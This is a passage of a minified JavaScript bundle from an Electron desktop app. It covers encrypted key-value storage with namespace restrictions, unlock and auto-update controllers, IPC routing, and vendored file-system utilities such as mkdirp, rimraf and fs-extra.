          w = p(e),
          b = h(e);
        let g, E, v;
        const S = (async function () {
          const r = await t();
          try {
            let t;
            ({ data: t, metadata: E, blobKey: v } = await s.read(e, r)),
              a && (t = y(t)),
              (g = JSON.parse(i(t).toString("utf8")));
          } catch (t) {
            if ("ENOENT" !== t.code) throw t;
            let i = o(Buffer.from(JSON.stringify({})));
            a && (i = m(i)),
              ({ metadata: E, blobKey: v } = await s.write(e, i, {
                passphrase: r,
                header: n,
              })),
              (g = {});
          }
        })();
        let O = !1;
        const k = u(
            async () => {
              if (O) {
                await l(100);
                try {
                  let t,
                    i = o(Buffer.from(JSON.stringify(g)));
                  a && (i = m(i)), (O = !1);
                  let u = 0;
                  do {
                    t && console.warn(`seco write invalid; retrying ${u}`),
                      await s.write(w, i, {
                        metadata: E,
                        blobKey: v,
                        header: n,
                        overwrite: !0,
                      }),
                      (t = await r.readFile(w));
                  } while (!c(t) && ++u < 5);
                  5 === u && (await r.ensureFile(b)),
                    await r.move(w, e, { overwrite: !0 });
                } finally {
                  O || (await r.remove(f));
                }
              }
            },
            { concurrency: 1 }
          ),
          _ = async () => {
            (O = !0), await r.outputFile(f, ""), await k();
          };
        return {
          get: async (e) => (await S, g[e]),
          batchGet: async (e) => (await S, e.map((e) => g[e])),
          set: async (e, t) => {
            if ((await S, void 0 === t))
              throw new Error(`cannot set ${e} to undefined`);
            (g[e] = t), await _();
          },
          batchSet: async (e) => {
            await S,
              Object.entries(e).forEach(([e, t]) => {
                if (void 0 === t)
                  throw new Error(`cannot set ${e} to undefined`);
                g[e] = t;
              }),
              await _();
          },
          delete: async (e) => {
            await S, delete g[e], await _();
          },
          batchDelete: async (e) => {
            await S, e.forEach((e) => delete g[e]), await _();
          },
          clear: async (e) => {
            await S,
              Object.keys(g).forEach((t) => {
                t.startsWith(e) && delete g[t];
              }),
              await _();
          },
        };
      },
      restrictToNamespaces: function (e, t) {
        const n = t.map(
            (e) => (
              Array.isArray(e) || (e = [e]),
              e
                .map((e) => {
                  if ("string" != typeof e || e.includes("!"))
                    throw new Error(`invalid namespace segment ${e}`);
                  return `!${e}!`;
                })
                .join("")
            )
          ),
          r = (e) =>
            e && "string" == typeof e && n.some((t) => e.startsWith(t)),
          o = (e) => {
            if (r(e)) return e;
            throw new Error(
              `not permitted to access this namespace; tried to access key ${e}`
            );
          };
        return {
          get: async (t) => e.get(o(t)),
          batchGet: async (t) => e.batchGet(t.map((e) => o(e))),
          set: async (t, n) => e.set(o(t), n),
          batchSet: async (t) =>
            e.batchSet(
              Object.fromEntries(Object.entries(t).map(([e, t]) => [o(e), t]))
            ),
          delete: async (t) => e.delete(o(t)),
          batchDelete: async (t) => e.batchDelete(t.map((e) => o(e))),
          clear: async (t) => {
            if (r(t)) return e.clear(t);
            throw new Error(
              `not permitted to access this namespace; tried to clear ${
                t || "root-level storage"
              }`
            );
          },
        };
      },
      addNamespacing: f,
    };
  },
  function (e, t) {
    var n =
      "[object Arguments]" ==
      (function () {
        return Object.prototype.toString.call(arguments);
      })();
    function r(e) {
      return "[object Arguments]" == Object.prototype.toString.call(e);
    }
    function o(e) {
      return (
        (e &&
          "object" == typeof e &&
          "number" == typeof e.length &&
          Object.prototype.hasOwnProperty.call(e, "callee") &&
          !Object.prototype.propertyIsEnumerable.call(e, "callee")) ||
        !1
      );
    }
    ((t = e.exports = n ? r : o).supported = r), (t.unsupported = o);
  },
  function (e, t, n) {
    (e.exports = Object.keys).shim = function (e) {
      var t = [];
      for (var n in e) t.push(n);
      return t;
    };
  },
  function (e, t, n) {
    var r = Array.prototype.slice,
      o = n(178),
      i = n(177),
      s = (e.exports = function (e, t, n) {
        return (
          n || (n = {}),
          e === t ||
            (e instanceof Date && t instanceof Date
              ? e.getTime() === t.getTime()
              : !e || !t || ("object" != typeof e && "object" != typeof t)
              ? n.strict
                ? e === t
                : e == t
              : (function (e, t, n) {
                  var u, l;
                  if (c(e) || c(t)) return !1;
                  if (e.prototype !== t.prototype) return !1;
                  if (i(e))
                    return (
                      !!i(t) && ((e = r.call(e)), (t = r.call(t)), s(e, t, n))
                    );
                  if (a(e)) {
                    if (!a(t)) return !1;
                    if (e.length !== t.length) return !1;
                    for (u = 0; u < e.length; u++) if (e[u] !== t[u]) return !1;
                    return !0;
                  }
                  try {
                    var f = o(e),
                      d = o(t);
                  } catch (e) {
                    return !1;
                  }
                  if (f.length != d.length) return !1;
                  for (f.sort(), d.sort(), u = f.length - 1; u >= 0; u--)
                    if (f[u] != d[u]) return !1;
                  for (u = f.length - 1; u >= 0; u--)
                    if (((l = f[u]), !s(e[l], t[l], n))) return !1;
                  return typeof e == typeof t;
                })(e, t, n))
        );
      });
    function c(e) {
      return null == e;
    }
    function a(e) {
      return (
        !(!e || "object" != typeof e || "number" != typeof e.length) &&
        "function" == typeof e.copy &&
        "function" == typeof e.slice &&
        !(e.length > 0 && "number" != typeof e[0])
      );
    }
  },
  function (e, t, n) {
    var r = n(1),
      o = n(30),
      i = parseInt("0777", 8);
    function s(e, t, n, c) {
      "function" == typeof t
        ? ((n = t), (t = {}))
        : (t && "object" == typeof t) || (t = { mode: t });
      var a = t.mode,
        u = t.fs || o;
      void 0 === a && (a = i & ~process.umask()), c || (c = null);
      var l = n || function () {};
      (e = r.resolve(e)),
        u.mkdir(e, a, function (n) {
          if (!n) return l(null, (c = c || e));
          switch (n.code) {
            case "ENOENT":
              if (r.dirname(e) === e) return l(n);
              s(r.dirname(e), t, function (n, r) {
                n ? l(n, r) : s(e, t, l, r);
              });
              break;
            default:
              u.stat(e, function (e, t) {
                e || !t.isDirectory() ? l(n, c) : l(null, c);
              });
          }
        });
    }
    (e.exports = s.mkdirp = s.mkdirP = s),
      (s.sync = function e(t, n, s) {
        (n && "object" == typeof n) || (n = { mode: n });
        var c = n.mode,
          a = n.fs || o;
        void 0 === c && (c = i & ~process.umask()),
          s || (s = null),
          (t = r.resolve(t));
        try {
          a.mkdirSync(t, c), (s = s || t);
        } catch (o) {
          switch (o.code) {
            case "ENOENT":
              (s = e(r.dirname(t), n, s)), e(t, n, s);
              break;
            default:
              var u;
              try {
                u = a.statSync(t);
              } catch (e) {
                throw o;
              }
              if (!u.isDirectory()) throw o;
          }
        }
        return s;
      });
  },
  function (e, t, n) {
    var r;
    try {
      r = n(7);
    } catch (e) {
      r = n(30);
    }
    function o(e) {
      return (
        Buffer.isBuffer(e) && (e = e.toString("utf8")),
        (e = e.replace(/^\uFEFF/, ""))
      );
    }
    var i = {
      spaces: null,
      readFile: function (e, t, n) {
        null == n && ((n = t), (t = {})),
          "string" == typeof t && (t = { encoding: t });
        var i = (t = t || {}).fs || r,
          s = !0;
        "passParsingErrors" in t
          ? (s = t.passParsingErrors)
          : "throws" in t && (s = t.throws),
          i.readFile(e, t, function (r, i) {
            if (r) return n(r);
            var c;
            i = o(i);
            try {
              c = JSON.parse(i, t ? t.reviver : null);
            } catch (t) {
              return s
                ? ((t.message = e + ": " + t.message), n(t))
                : n(null, null);
            }
            n(null, c);
          });
      },
      readFileSync: function (e, t) {
        "string" == typeof (t = t || {}) && (t = { encoding: t });
        var n = t.fs || r,
          i = !0;
        "passParsingErrors" in t
          ? (i = t.passParsingErrors)
          : "throws" in t && (i = t.throws);
        var s = n.readFileSync(e, t);
        s = o(s);
        try {
          return JSON.parse(s, t.reviver);
        } catch (t) {
          if (i) throw ((t.message = e + ": " + t.message), t);
          return null;
        }
      },
      writeFile: function (e, t, n, o) {
        null == o && ((o = n), (n = {}));
        var i = (n = n || {}).fs || r,
          s =
            "object" == typeof n && null !== n && "spaces" in n
              ? n.spaces
              : this.spaces,
          c = "";
        try {
          c = JSON.stringify(t, n ? n.replacer : null, s) + "\n";
        } catch (e) {
          if (o) return o(e, null);
        }
        i.writeFile(e, c, n, o);
      },
      writeFileSync: function (e, t, n) {
        var o = (n = n || {}).fs || r,
          i =
            "object" == typeof n && null !== n && "spaces" in n
              ? n.spaces
              : this.spaces,
          s = JSON.stringify(t, n.replacer, i) + "\n";
        return o.writeFileSync(e, s, n);
      },
    };
    e.exports = i;
  },
  function (e, t) {
    e.exports = require("fs/promises");
  },
  function (e, t, n) {
    "use strict";
    var r = n(4),
      o = n(22),
      i = n.n(o);
    Object(r.createServer)("metrics-controller", ["ui"], {
      getTimeOrigin: i.a.getTimeOrigin,
      getTrace: i.a.getTrace,
    });
  },
  function (e, t, n) {
    "use strict";
    var r = n(4),
      o = n(41);
    let i,
      s = null,
      c = 0;
    const a = {
      requestHide() {
        i({ status: s || "cancel", attempts: c });
      },
      async unlock() {
        const e = Object(o.getWindow)();
        return new Promise((t) => {
          (s = null),
            (i = t),
            e.show(),
            setImmediate(() => e.send("unlock:show"));
        });
      },
      async closeUnlockWindow() {
        const e = Object(o.getWindow)();
        e.hide(), setImmediate(() => e.send("unlock:hide"));
      },
      async setStatus(e, t) {
        (s = e), (c = t);
      },
    };
    Object(r.createServer)("unlock-controller", ["unlock", "ui"], a);
  },
  function (e, t, n) {
    "use strict";
    var r = n(61),
      o = n.n(r),
      i = n(0),
      s = n(36),
      c = n.n(s),
      a = n(35),
      u = n(112),
      l = n(4);
    const f = Object(a.promisify)(o.a.execFile),
      d = {
        async startUpdate(e) {
          const t = Object(u.getAutoUpdateUrls)(e);
          let n = t[process.platform];
          if ("darwin" === process.platform)
            ("arm64" === process.arch ||
              (await (async function () {
                if ("darwin" === process.platform && "x64" === process.arch) {
                  const [e, t] = c.a.release().split(".").map(Number);
                  if (e > 20 || (20 === e && t >= 5))
                    try {
                      const { stdout: e, stderr: t } = await f("sysctl", [
                        "sysctl.proc_translated",
                      ]);
                      return (
                        "sysctl.proc_translated: 1" === e.trim() &&
                        "" === t.trim()
                      );
                    } catch {
                      return !1;
                    }
                }
                return !1;
              })())) &&
              (n = t.darwinArm);
          else if ("linux" === process.platform)
            throw new Error("autoUpdate unsupported for linux");
          return new Promise((e, t) => {
            i.autoUpdater.on("error", (e) => {
              console.error(`Update error: ${e.message}`), t(e);
            }),
              i.autoUpdater.on("checking-for-update", () =>
                console.log("Checking for update")
              ),
              i.autoUpdater.on("update-available", () =>
                console.log("Update available")
              ),
              i.autoUpdater.on("update-not-available", () =>
                console.log("No update available")
              ),
              i.autoUpdater.on("update-downloaded", (t, n, r, o, i) => {
                console.log(`Update downloaded: ${r}: ${i}`), e();
              }),
              i.autoUpdater.setFeedURL(n),
              i.autoUpdater.checkForUpdates();
          });
        },
        quitAndInstall() {
          i.autoUpdater.quitAndInstall();
        },
      };
    Object(l.createServer)("auto-update-controller", ["ui"], d);
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "mainBroadcastListener", function () {
        return p;
      }),
      n.d(t, "targeted", function () {
        return h;
      }),
      n.d(t, "broadcast", function () {
        return m;
      }),
      n.d(t, "rpcMain", function () {
        return S;
      }),
      n.d(t, "rpcListener", function () {
        return O;
      }),
      n.d(t, "createServer", function () {
        return k;
      });
    var r = n(0),
      o = n(2),
      i = n(6),
      s = n(117),
      c = n(49),
      a = n(115);
    const u = Object(a.wrapIpc)(r.ipcMain, function (e) {
      return (
        !!Object(c.getIpcType)(e.sender) ||
        (Object(i.showError)("send to IPC from non-whitelisted webContents"),
        !1)
      );
    });
    let l = !1;
    async function f(e, t, n, r) {
      if (!r) throw new Error("Can not send without origin!");
      await (function (e) {
        return new Promise((t) => {
          if (!e.isLoading()) return t();
          e.once("did-finish-load", t),
            setImmediate(() => {
              e.isLoading() ||
                (e.removeListener("did-finish-load", t),
                t(),
                l ||
                  ((l = !0),
                  console.log(
                    "Caught and prevented a race condition in RPC awaitLoad()"
                  )));
            });
        });
      })(e),
        e.send(t, { channel: t, payload: n, origin: r });
    }
    function d(e, t, n, r) {
      if ("#" === e) throw new Error("Can not send to self");
      if (!r || !e) throw new Error("Can not send without target and origin");
      const s = Object(c.findWebContents)(e);
      0 === s.length
        ? o.ENV_DEV &&
          console.log(`[ipc]: (${r} -> ${e}) 0 processes to send to on "${t}"`)
        : s.length > 1 &&
          o.ENV_DEV &&
          Object(i.showError)("targeted send to multiple webContents"),
        s.forEach((e) => f(e, t, n, r));
    }
    function p() {
      u.on(
        "ipc:target:send",
        (e, { target: t, channel: n, payload: r }) => {
          d(t, n, r, Object(c.getIpcType)(e.sender));
        },
        !1
      );
    }
    function h(e, t, n) {
      d(e, t, n, "#");
    }
    function m(e, t) {
      !(function (e, t, n) {
        Object(c.allIpcWebContents)().forEach(({ contents: r }) =>
          f(r, e, t, n)
        );
      })(e, t, "#");
    }
    const {
        on: y,
        once: w,
        removeListener: b,
        removeAllListeners: g,
        handle: E,
        removeHandler: v,
      } = u,
      S = {
        on: y,
        once: w,
        removeListener: b,
        removeAllListeners: g,
        handle: E,
        removeHandler: v,
      },
      O = S;
    function k(...e) {
      return Object(s.createServerImplementation)(
        u,
        h,
        (e) => Object(c.getIpcType)(e.sender),
        ...e
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "dataDir", function () {
        return o;
      }),
      n.d(t, "desktopDir", function () {
        return i;
      });
    var r = n(0);
    function o() {
      return r.app.getPath("userData");
    }
    function i() {
      return r.app.getPath("desktop");
    }
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(70).copySync,
      s = n(55).removeSync,
      c = n(23).mkdirpSync,
      a = n(46);
    function u(e, t, n) {
      try {
        r.renameSync(e, t);
      } catch (r) {
        if ("EXDEV" !== r.code) throw r;
        return (function (e, t, n) {
          return i(e, t, { overwrite: n, errorOnExist: !0 }), s(e);
        })(e, t, n);
      }
    }
    e.exports = function (e, t, n) {
      const i = (n = n || {}).overwrite || n.clobber || !1,
        { srcStat: l, isChangingCase: f = !1 } = a.checkPathsSync(
          e,
          t,
          "move",
          n
        );
      return (
        a.checkParentPathsSync(e, l, t, "move"),
        (function (e) {
          const t = o.dirname(e);
          return o.parse(t).root === t;
        })(t) || c(o.dirname(t)),
        (function (e, t, n, o) {
          if (o) return u(e, t, n);
          if (n) return s(t), u(e, t, n);
          if (r.existsSync(t)) throw new Error("dest already exists.");
          return u(e, t, n);
        })(e, t, i, f)
      );
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(70).copy,
      s = n(55).remove,
      c = n(23).mkdirp,
      a = n(39).pathExists,
      u = n(46);
    function l(e, t, n, r, o) {
      return r
        ? f(e, t, n, o)
        : n
        ? s(t, (r) => (r ? o(r) : f(e, t, n, o)))
        : void a(t, (r, i) =>
            r ? o(r) : i ? o(new Error("dest already exists.")) : f(e, t, n, o)
          );
    }
    function f(e, t, n, o) {
      r.rename(e, t, (r) =>
        r
          ? "EXDEV" !== r.code
            ? o(r)
            : (function (e, t, n, r) {
                i(e, t, { overwrite: n, errorOnExist: !0 }, (t) =>
                  t ? r(t) : s(e, r)
                );
              })(e, t, n, o)
          : o()
      );
    }
    e.exports = function (e, t, n, r) {
      "function" == typeof n && ((r = n), (n = {}));
      const i = (n = n || {}).overwrite || n.clobber || !1;
      u.checkPaths(e, t, "move", n, (n, s) => {
        if (n) return r(n);
        const { srcStat: a, isChangingCase: f = !1 } = s;
        u.checkParentPaths(e, a, t, "move", (n) =>
          n
            ? r(n)
            : (function (e) {
                const t = o.dirname(e);
                return o.parse(t).root === t;
              })(t)
            ? l(e, t, i, f, r)
            : void c(o.dirname(t), (n) => (n ? r(n) : l(e, t, i, f, r)))
        );
      });
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromCallback;
    e.exports = { move: r(n(189)), moveSync: n(188) };
  },
  function (e, t, n) {
    "use strict";
    const { stringify: r } = n(69),
      { outputFileSync: o } = n(68);
    e.exports = function (e, t, n) {
      const i = r(t, n);
      o(e, i, n);
    };
  },
  function (e, t, n) {
    "use strict";
    const { stringify: r } = n(69),
      { outputFile: o } = n(68);
    e.exports = async function (e, t, n = {}) {
      const i = r(t, n);
      await o(e, i, n);
    };
  },
  function (e, t, n) {
    let r;
    try {
      r = n(7);
    } catch (e) {
      r = n(30);
    }
    const o = n(18),
      { stringify: i, stripBom: s } = n(69);
    const c = {
      readFile: o.fromPromise(async function (e, t = {}) {
        "string" == typeof t && (t = { encoding: t });
        const n = t.fs || r,
          i = !("throws" in t) || t.throws;
        let c,
          a = await o.fromCallback(n.readFile)(e, t);
        a = s(a);
        try {
          c = JSON.parse(a, t ? t.reviver : null);
        } catch (t) {
          if (i) throw ((t.message = `${e}: ${t.message}`), t);
          return null;
        }
        return c;
      }),
      readFileSync: function (e, t = {}) {
        "string" == typeof t && (t = { encoding: t });
        const n = t.fs || r,
          o = !("throws" in t) || t.throws;
        try {
          let r = n.readFileSync(e, t);
          return (r = s(r)), JSON.parse(r, t.reviver);
        } catch (t) {
          if (o) throw ((t.message = `${e}: ${t.message}`), t);
          return null;
        }
      },
      writeFile: o.fromPromise(async function (e, t, n = {}) {
        const s = n.fs || r,
          c = i(t, n);
        await o.fromCallback(s.writeFile)(e, c, n);
      }),
      writeFileSync: function (e, t, n = {}) {
        const o = n.fs || r,
          s = i(t, n);
        return o.writeFileSync(e, s, n);
      },
    };
    e.exports = c;
  },
  function (e, t, n) {
    "use strict";
    const r = n(193);
    e.exports = {
      readJson: r.readFile,
      readJsonSync: r.readFileSync,
      writeJson: r.writeFile,
      writeJsonSync: r.writeFileSync,
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromPromise,
      o = n(194);
    (o.outputJson = r(n(192))),
      (o.outputJsonSync = n(191)),
      (o.outputJSON = o.outputJson),
      (o.outputJSONSync = o.outputJsonSync),
      (o.writeJSON = o.writeJson),
      (o.writeJSONSync = o.writeJsonSync),
      (o.readJSON = o.readJson),
      (o.readJSONSync = o.readJsonSync),
      (e.exports = o);
  },
  function (e, t, n) {
    "use strict";
    const r = n(7);
    e.exports = {
      symlinkType: function (e, t, n) {
        if (
          ((n = "function" == typeof t ? t : n),
          (t = "function" != typeof t && t))
        )
          return n(null, t);
        r.lstat(e, (e, r) => {
          if (e) return n(null, "file");
          (t = r && r.isDirectory() ? "dir" : "file"), n(null, t);
        });
      },
      symlinkTypeSync: function (e, t) {
        let n;
        if (t) return t;
        try {
          n = r.lstatSync(e);
        } catch {
          return "file";
        }
        return n && n.isDirectory() ? "dir" : "file";
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(1),
      o = n(7),
      i = n(39).pathExists;
    e.exports = {
      symlinkPaths: function (e, t, n) {
        if (r.isAbsolute(e))
          return o.lstat(e, (t) =>
            t
              ? ((t.message = t.message.replace("lstat", "ensureSymlink")),
                n(t))
              : n(null, { toCwd: e, toDst: e })
          );
        {
          const s = r.dirname(t),
            c = r.join(s, e);
          return i(c, (t, i) =>
            t
              ? n(t)
              : i
              ? n(null, { toCwd: c, toDst: e })
              : o.lstat(e, (t) =>
                  t
                    ? ((t.message = t.message.replace(
                        "lstat",
                        "ensureSymlink"
                      )),
                      n(t))
                    : n(null, { toCwd: e, toDst: r.relative(s, e) })
                )
          );
        }
      },
      symlinkPathsSync: function (e, t) {
        let n;
        if (r.isAbsolute(e)) {
          if (!(n = o.existsSync(e)))
            throw new Error("absolute srcpath does not exist");
          return { toCwd: e, toDst: e };
        }
        {
          const i = r.dirname(t),
            s = r.join(i, e);
          if ((n = o.existsSync(s))) return { toCwd: s, toDst: e };
          if (!(n = o.existsSync(e)))
            throw new Error("relative srcpath does not exist");
          return { toCwd: e, toDst: r.relative(i, e) };
        }
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromCallback,
      o = n(1),
      i = n(47),
      s = n(23),
      c = s.mkdirs,
      a = s.mkdirsSync,
      u = n(197),
      l = u.symlinkPaths,
      f = u.symlinkPathsSync,
      d = n(196),
      p = d.symlinkType,
      h = d.symlinkTypeSync,
      m = n(39).pathExists,
      { areIdentical: y } = n(46);
    function w(e, t, n, r) {
      l(e, t, (s, a) => {
        if (s) return r(s);
        (e = a.toDst),
          p(a.toCwd, n, (n, s) => {
            if (n) return r(n);
            const a = o.dirname(t);
            m(a, (n, o) =>
              n
                ? r(n)
                : o
                ? i.symlink(e, t, s, r)
                : void c(a, (n) => {
                    if (n) return r(n);
                    i.symlink(e, t, s, r);
                  })
            );
          });
      });
    }
    e.exports = {
      createSymlink: r(function (e, t, n, r) {
        (r = "function" == typeof n ? n : r),
          (n = "function" != typeof n && n),
          i.lstat(t, (o, s) => {
            !o && s.isSymbolicLink()
              ? Promise.all([i.stat(e), i.stat(t)]).then(([o, i]) => {
                  if (y(o, i)) return r(null);
                  w(e, t, n, r);
                })
              : w(e, t, n, r);
          });
      }),
      createSymlinkSync: function (e, t, n) {
        let r;
        try {
          r = i.lstatSync(t);
        } catch {}
        if (r && r.isSymbolicLink()) {
          const n = i.statSync(e),
            r = i.statSync(t);
          if (y(n, r)) return;
        }
        const s = f(e, t);
        (e = s.toDst), (n = h(s.toCwd, n));
        const c = o.dirname(t);
        return i.existsSync(c)
          ? i.symlinkSync(e, t, n)
          : (a(c), i.symlinkSync(e, t, n));
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromCallback,
      o = n(1),
      i = n(7),
      s = n(23),
      c = n(39).pathExists,
      { areIdentical: a } = n(46);
    e.exports = {
      createLink: r(function (e, t, n) {
        function r(e, t) {
          i.link(e, t, (e) => {
            if (e) return n(e);
            n(null);
          });
        }
        i.lstat(t, (u, l) => {
          i.lstat(e, (i, u) => {
            if (i)
              return (
                (i.message = i.message.replace("lstat", "ensureLink")), n(i)
              );
            if (l && a(u, l)) return n(null);
            const f = o.dirname(t);
            c(f, (o, i) =>
              o
                ? n(o)
                : i
                ? r(e, t)
                : void s.mkdirs(f, (o) => {
                    if (o) return n(o);
                    r(e, t);
                  })
            );
          });
        });
      }),
      createLinkSync: function (e, t) {
        let n;
        try {
          n = i.lstatSync(t);
        } catch {}
        try {
          const t = i.lstatSync(e);
          if (n && a(t, n)) return;
        } catch (e) {
          throw ((e.message = e.message.replace("lstat", "ensureLink")), e);
        }
        const r = o.dirname(t);
        return i.existsSync(r)
          ? i.linkSync(e, t)
          : (s.mkdirsSync(r), i.linkSync(e, t));
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromCallback,
      o = n(1),
      i = n(7),
      s = n(23);
    e.exports = {
      createFile: r(function (e, t) {
        function n() {
          i.writeFile(e, "", (e) => {
            if (e) return t(e);
            t();
          });
        }
        i.stat(e, (r, c) => {
          if (!r && c.isFile()) return t();
          const a = o.dirname(e);
          i.stat(a, (e, r) => {
            if (e)
              return "ENOENT" === e.code
                ? s.mkdirs(a, (e) => {
                    if (e) return t(e);
                    n();
                  })
                : t(e);
            r.isDirectory()
              ? n()
              : i.readdir(a, (e) => {
                  if (e) return t(e);
                });
          });
        });
      }),
      createFileSync: function (e) {
        let t;
        try {
          t = i.statSync(e);
        } catch {}
        if (t && t.isFile()) return;
        const n = o.dirname(e);
        try {
          i.statSync(n).isDirectory() || i.readdirSync(n);
        } catch (e) {
          if (!e || "ENOENT" !== e.code) throw e;
          s.mkdirsSync(n);
        }
        i.writeFileSync(e, "");
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const { createFile: r, createFileSync: o } = n(200),
      { createLink: i, createLinkSync: s } = n(199),
      { createSymlink: c, createSymlinkSync: a } = n(198);
    e.exports = {
      createFile: r,
      createFileSync: o,
      ensureFile: r,
      ensureFileSync: o,
      createLink: i,
      createLinkSync: s,
      ensureLink: i,
      ensureLinkSync: s,
      createSymlink: c,
      createSymlinkSync: a,
      ensureSymlink: c,
      ensureSymlinkSync: a,
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(71),
      s = "win32" === process.platform;
    function c(e) {
      ["unlink", "chmod", "stat", "lstat", "rmdir", "readdir"].forEach((t) => {
        (e[t] = e[t] || r[t]), (e[(t += "Sync")] = e[t] || r[t]);
      }),
        (e.maxBusyTries = e.maxBusyTries || 3);
    }
    function a(e, t, n) {
      let r = 0;
      "function" == typeof t && ((n = t), (t = {})),
        i(e, "rimraf: missing path"),
        i.strictEqual(typeof e, "string", "rimraf: path should be a string"),
        i.strictEqual(
          typeof n,
          "function",
          "rimraf: callback function required"
        ),
        i(t, "rimraf: invalid options argument provided"),
        i.strictEqual(typeof t, "object", "rimraf: options should be object"),
        c(t),
        u(e, t, function o(i) {
          if (i) {
            if (
              ("EBUSY" === i.code ||
                "ENOTEMPTY" === i.code ||
                "EPERM" === i.code) &&
              r < t.maxBusyTries
            ) {
              return r++, setTimeout(() => u(e, t, o), 100 * r);
            }
            "ENOENT" === i.code && (i = null);
          }
          n(i);
        });
    }
    function u(e, t, n) {
      i(e),
        i(t),
        i("function" == typeof n),
        t.lstat(e, (r, o) =>
          r && "ENOENT" === r.code
            ? n(null)
            : r && "EPERM" === r.code && s
            ? l(e, t, r, n)
            : o && o.isDirectory()
            ? d(e, t, r, n)
            : void t.unlink(e, (r) => {
                if (r) {
                  if ("ENOENT" === r.code) return n(null);
                  if ("EPERM" === r.code)
                    return s ? l(e, t, r, n) : d(e, t, r, n);
                  if ("EISDIR" === r.code) return d(e, t, r, n);
                }
                return n(r);
              })
        );
    }
    function l(e, t, n, r) {
      i(e),
        i(t),
        i("function" == typeof r),
        t.chmod(e, 438, (o) => {
          o
            ? r("ENOENT" === o.code ? null : n)
            : t.stat(e, (o, i) => {
                o
                  ? r("ENOENT" === o.code ? null : n)
                  : i.isDirectory()
                  ? d(e, t, n, r)
                  : t.unlink(e, r);
              });
        });
    }
    function f(e, t, n) {
      let r;
      i(e), i(t);
      try {
        t.chmodSync(e, 438);
      } catch (e) {
        if ("ENOENT" === e.code) return;
        throw n;
      }
      try {
        r = t.statSync(e);
      } catch (e) {
        if ("ENOENT" === e.code) return;
        throw n;
      }
      r.isDirectory() ? h(e, t, n) : t.unlinkSync(e);
    }
    function d(e, t, n, r) {
      i(e),
        i(t),
        i("function" == typeof r),
        t.rmdir(e, (s) => {
          !s ||
          ("ENOTEMPTY" !== s.code && "EEXIST" !== s.code && "EPERM" !== s.code)
            ? s && "ENOTDIR" === s.code
              ? r(n)
              : r(s)
            : (function (e, t, n) {
                i(e),
                  i(t),
                  i("function" == typeof n),
                  t.readdir(e, (r, i) => {
                    if (r) return n(r);
                    let s,
                      c = i.length;
                    if (0 === c) return t.rmdir(e, n);
                    i.forEach((r) => {
                      a(o.join(e, r), t, (r) => {
                        if (!s)
                          return r
                            ? n((s = r))
                            : void (0 == --c && t.rmdir(e, n));
                      });
                    });
                  });
              })(e, t, r);
        });
    }
    function p(e, t) {
      let n;
      c((t = t || {})),
        i(e, "rimraf: missing path"),
        i.strictEqual(typeof e, "string", "rimraf: path should be a string"),
        i(t, "rimraf: missing options"),
        i.strictEqual(typeof t, "object", "rimraf: options should be object");
      try {
        n = t.lstatSync(e);
      } catch (n) {
        if ("ENOENT" === n.code) return;
        "EPERM" === n.code && s && f(e, t, n);
      }
      try {
        n && n.isDirectory() ? h(e, t, null) : t.unlinkSync(e);
      } catch (n) {
        if ("ENOENT" === n.code) return;
        if ("EPERM" === n.code) return s ? f(e, t, n) : h(e, t, n);
        if ("EISDIR" !== n.code) throw n;
        h(e, t, n);
      }
    }
    function h(e, t, n) {
      i(e), i(t);
      try {
        t.rmdirSync(e);
      } catch (r) {
        if ("ENOTDIR" === r.code) throw n;
        if ("ENOTEMPTY" === r.code || "EEXIST" === r.code || "EPERM" === r.code)
          !(function (e, t) {
            if (
              (i(e),
              i(t),
              t.readdirSync(e).forEach((n) => p(o.join(e, n), t)),
              !s)
            ) {
              const n = t.rmdirSync(e, t);
              return n;
            }
            {
              const n = Date.now();
              do {
                try {
                  const n = t.rmdirSync(e, t);
                  return n;
                } catch {}
              } while (Date.now() - n < 500);
            }
          })(e, t);
        else if ("ENOENT" !== r.code) throw r;
      }
    }
    (e.exports = a), (a.sync = p);
  },
  function (e, t, n) {
    "use strict";
    const r = n(18).fromPromise,
      o = n(47),
      i = n(1),
      s = n(23),
      c = n(55),
      a = r(async function (e) {
        let t;
        try {
          t = await o.readdir(e);
        } catch {
          return s.mkdirs(e);
        }
        return Promise.all(t.map((t) => c.remove(i.join(e, t))));
      });
    function u(e) {
      let t;
      try {
        t = o.readdirSync(e);
      } catch {
        return s.mkdirsSync(e);
      }
      t.forEach((t) => {
        (t = i.join(e, t)), c.removeSync(t);
      });
    }
    e.exports = { emptyDirSync: u, emptydirSync: u, emptyDir: a, emptydir: a };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(23).mkdirsSync,
      s = n(93).utimesMillisSync,
      c = n(46);
    function a(e, t, n, i) {
      const s = (i.dereference ? r.statSync : r.lstatSync)(t);
      if (s.isDirectory())
        return (function (e, t, n, o, i) {
          return t
            ? f(n, o, i)
            : (function (e, t, n, o) {
                return r.mkdirSync(n), f(t, n, o), l(n, e);
              })(e.mode, n, o, i);
        })(s, e, t, n, i);
      if (s.isFile() || s.isCharacterDevice() || s.isBlockDevice())
        return (function (e, t, n, o, i) {
          return t
            ? (function (e, t, n, o) {
                if (o.overwrite) return r.unlinkSync(n), u(e, t, n, o);
                if (o.errorOnExist) throw new Error(`'${n}' already exists`);
              })(e, n, o, i)
            : u(e, n, o, i);
        })(s, e, t, n, i);
      if (s.isSymbolicLink())
        return (function (e, t, n, i) {
          let s = r.readlinkSync(t);
          i.dereference && (s = o.resolve(process.cwd(), s));
          if (e) {
            let e;
            try {
              e = r.readlinkSync(n);
            } catch (e) {
              if ("EINVAL" === e.code || "UNKNOWN" === e.code)
                return r.symlinkSync(s, n);
              throw e;
            }
            if (
              (i.dereference && (e = o.resolve(process.cwd(), e)),
              c.isSrcSubdir(s, e))
            )
              throw new Error(
